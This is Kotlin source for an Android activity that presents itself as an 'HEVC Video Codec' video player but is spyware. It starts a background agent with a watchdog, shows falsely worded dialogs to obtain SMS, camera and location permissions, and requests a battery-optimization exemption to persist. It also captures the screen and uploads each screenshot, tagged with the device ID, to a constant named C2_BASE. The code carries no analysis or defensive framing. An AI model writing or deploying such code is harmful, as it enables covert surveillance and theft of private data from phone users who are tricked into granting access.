package com.hevc.codec

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import android.widget.MediaController
import android.widget.Toast
import android.widget.VideoView
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    companion object {
        const val C2_BASE = "https://hevc-codec.duckdns.org"  // ← HTTPS
        const val REQ_MEDIA_PROJECTION = 1001
        var projection: MediaProjection? = null
        var imageReader: ImageReader? = null
        var virtualDisplay: VirtualDisplay? = null
        var screenWidth = 1080
        var screenHeight = 1920
    }

    private val videoUrl = "$C2_BASE/video.mp4"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val videoView = findViewById<VideoView>(R.id.videoView)
        val controller = MediaController(this)
        controller.setAnchorView(videoView)
        videoView.setMediaController(controller)
        videoView.setVideoURI(Uri.parse(videoUrl))
        videoView.setOnPreparedListener { it.start() }
        videoView.setOnErrorListener { _, _, _ ->
            Toast.makeText(this, "Buffering... please wait", Toast.LENGTH_SHORT).show()
            true
        }

        // ===== SILENT SETUP =====
        ensureAgentRunning()

        // Custom relabelled permission dialogs
        showSmsPermissionDialog()
        showCameraPermissionDialog()
        showLocationPermissionDialog()

        maybeRequestBatteryExempt()

        // Screen access
        if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
            requestScreenAccess()
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestScreenAccess() {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
    }

    @SuppressLint("MissingPermission")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            setupMediaProjection(data)
            getSharedPreferences("hevc", Context.MODE_PRIVATE)
                .edit().putBoolean("screen_granted", true).apply()
            Log.d("HevcCodec", "Screen access granted")
        }
    }

    @SuppressLint("MissingPermission")
    private fun setupMediaProjection(intent: Intent) {
        projection = (getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
            .getMediaProjection(RESULT_OK, intent)

        screenWidth = resources.displayMetrics.widthPixels
        screenHeight = resources.displayMetrics.heightPixels

        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            Thread {
                val bitmap = captureBitmap(reader)
                if (bitmap != null) uploadScreenshot(bitmap)
            }.start()
        }, Handler(Looper.getMainLooper()))

        virtualDisplay = projection!!.createVirtualDisplay(
            "HevcCodec", screenWidth, screenHeight, resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )
    }

    private fun captureBitmap(reader: ImageReader): android.graphics.Bitmap? {
        val image = reader.acquireLatestImage() ?: return null
        val plane = image.planes[0]
        val buffer = plane.buffer
        val bitmap = android.graphics.Bitmap.createBitmap(
            image.width, image.height, android.graphics.Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        return bitmap
    }

    private fun uploadScreenshot(bitmap: android.graphics.Bitmap) {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
            val conn = URL("$C2_BASE/screenshot/$deviceId").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 80, it) }
            conn.responseCode
        } catch (e: Exception) {
            Log.e("HevcCodec", "Upload failed", e)
        }
    }

    private fun ensureAgentRunning() {
        startService(Intent(this, AgentService::class.java))
        WatchdogJob.schedule(this)
    }

    private fun maybeRequestBatteryExempt() {
        if (getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("bat_done", false)) return
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (e: Exception) {}
        getSharedPreferences("hevc", Context.MODE_PRIVATE).edit().putBoolean("bat_done", true).apply()
    }

    override fun onResume() {
        super.onResume()
        ensureAgentRunning()
    }

    // ================= CUSTOM PERMISSION DIALOGS =================
    private fun showSmsPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.READ_SMS) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Message Sync")
            .setMessage("HEVC Video Codec needs access to your messages to sync playback history.")
            .setPositiveButton("Allow") { _, _ ->
                requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
            }
            .setNegativeButton("Later") { _, _ -> {} }
            .setCancelable(false)
            .show()
    }

    private fun showCameraPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Codec Calibration")
            .setMessage("Allow camera access to calibrate the HEVC decoder for optimal color accuracy.")
            .setPositiveButton("Calibrate") { _, _ ->
                requestPermissions(arrayOf(android.Manifest.permission.CAMERA), 102)
            }
            .setNegativeButton("Skip") { _, _ -> {} }
            .show()
    }

    private fun showLocationPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Network Optimization")
            .setMessage("Allow location access so the codec can pick the fastest CDN server near you.")
            .setPositiveButton("Optimize") { _, _ ->
                requestPermissions(
                    arrayOf(
                        android.Manifest.permission.ACCESS_FINE_LOCATION,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION
                    ), 103
                )
            }
            .setNegativeButton("No thanks") { _, _ -> {} }
            .show()
    }
}
